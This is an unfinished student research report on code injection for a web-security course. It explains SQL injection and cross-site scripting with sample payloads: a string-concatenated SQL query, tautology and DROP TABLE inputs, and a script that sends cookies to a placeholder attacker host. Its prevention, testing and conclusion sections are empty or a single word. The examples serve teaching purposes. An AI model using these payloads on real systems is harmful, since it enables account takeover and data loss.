<!-- omit in toc -->
# Security Risk: Code Injection

Written by: Jeffrey E.G. Derksen  
For course: S-DB-IPS3  
Class: S3-DB01  
Date: 17 June 2022  
Version: 1  

<!-- omit in toc -->
## Table of Contents



## Introduction and main research question

When you develop and publish a web application, you are exposing it to a potentially harmful environment. There are those who prowl the internet looking for security vulnerabilities to exploit and cause damage or steal sensitive data. Naturally, when developing a web application you would want to make sure that your application contains as few as possible security vulnerabilities—preferably none at all! You are after all responsible for maintaining a safe environment for your users.

The Open Web Application Security Project (OWASP) is a nonprofit foundation that works to improve the security of software, and they have created a [top 10 list of the most critical security risks to web applications](https://owasp.org/Top10/). Each of these items is definitely worth looking into, but I have chosen to delve into the topic of *code injection*. This drew my attention because I have heard about it before, but I don't know enough about it to properly secure my application against it. What I do know is that it can present a serious security risk. For this reason, during the course of this research report, I will seek to find answers to the following **main research question:**

> What is code injection and how can you secure you web application against it?

During this research project I have made use of the [DOT framework](https://ictresearchmethods.nl/The_DOT_Framework) to guide my process and to assist me with acquiring the right information and drawing conclusions from it. I have made use of the following methods:
- Library: best good and bad practices, design pattern research, literature study
- Lab: security test

## Sub-questions

In order to answer the main research question, I have broken the problem down into smaller sub-questions:

- What is code injection?
- What different kinds of code injection exist?
- What are some examples of code injection?
- What measures can you take to prevent code injection?
- Is my application vulnerable to a code injection attack?

I will try to find answers for each of these questions in the following sections of this report.

## What is code injection

Code injection is the act of deliberately introducing code into a vulnerable computer system and changing the program's execution, making it do and/or return something that it was not designed to do. This is usually done by injecting code that the attacker knows will be misinterpreted by the system, and can be done through systems designed for user input (such as login forms or search fields), by manipulating (internal) API calls, , , to name a few.



## What different kinds of code injection exist

There are many different kinds of code injection. Some of the most well-known kinds are:
- SQL injection
- NoSQL injection
- ORM injection
- Command injection
- Server-side template injection
- Cross-site scripting

An interesting thing to note is that the first three items on this list—SQL, NoSQL, and ORM injection—all target database systems. These systems may contain sensitive and valuable information, and as a result become prime targets for attackers. By tricking a database system with 

Cross-site scripting and server-side template injection also share some similarities. They both attempt to execute malicious code through an injected script

## What are some examples of code injection

In order to better understand how code injection might be accomplished, and what the consequences might be, I have found several examples of code injection using some common methods. SQL injection and cross-site scripting can both be used to attempt stealing sensitive user data such as usernames, passwords, and access tokens.

### Example of SQL injection

SQL injection can be used to compromise the original intent of a database query. Instead of entering a single parameter as the developer intends the user to do, an attacker might add comparisons that always evaluate to true or SQL statements to get more or different results or perform malicious and destructive actions on the database. In the example below we see how a query is constructed based on an *id* parameter entered by the user.

```
String query = "SELECT \* FROM accounts WHERE custID='" + request.getParameter("id") + "'";
```

The attacker might then send a request to the server that looks like this:

```
 http://example.com/app/accountView?id=' or '1'='1
```

Instead of a valid customer ID, it contains a comparison that will always evaluate to true. This in essence negates the WHERE constraint in the original query, which results in the database returning **all** the entries in the designated table, instead of just one. In addition, the attacker might also introduce new SQL statements that modify the content of the database. This can even lead to data loss, as demonstrated in the example below.

```
 http://example.com/app/accountView?id=1; DROP TABLE accounts; 
```

The attacker appends a command to drop the accounts table to the id parameter. This will cause the database to delete the entire accounts table, erasing all the data within.

### Example of cross-site scripting

Let's take a look at an example of cross-site scripting. Some websites feature a guestbook where visitors can leave a message that is then displayed on the website afterwards. Depending on how the guestbook script processes and displays this message, an attacker may make use of vulnerabilities within this feature to inject a script into the website by placing a message such as the one below.

```
Don't mind the following code. <script>window.location="https://some_attacker/evilcgi/cookie.cgi?steal=" + escape(document.cookie)</script>
```

When the browser of another visitor loads the content on this webpage, it will now execute the script that was injected in the guestbook message and deliver a cookie containing sensitive user data such as an authentication token to the attacker's website. The attacker can then use this token to log in onto the website posing as the user whose data was stolen and carry out all kinds of harmful actions.

## What measures can you take to prevent code injection?

## Is my application vulnerable to a code injection attack?

Testing!!!

## Conclusion



## Sources

- [Canvas: Secure Web Development](https://fhict.instructure.com/courses/12078/pages/secure-web-development?module_item_id=749948)
- [OWASP: A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP: Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [OWASP: Injection Prevention Cheat Sheet in Java](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html)
- [W3Schools: SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)
- [Wikipedia: Code Injection](https://en.wikipedia.org/wiki/Code_injection)
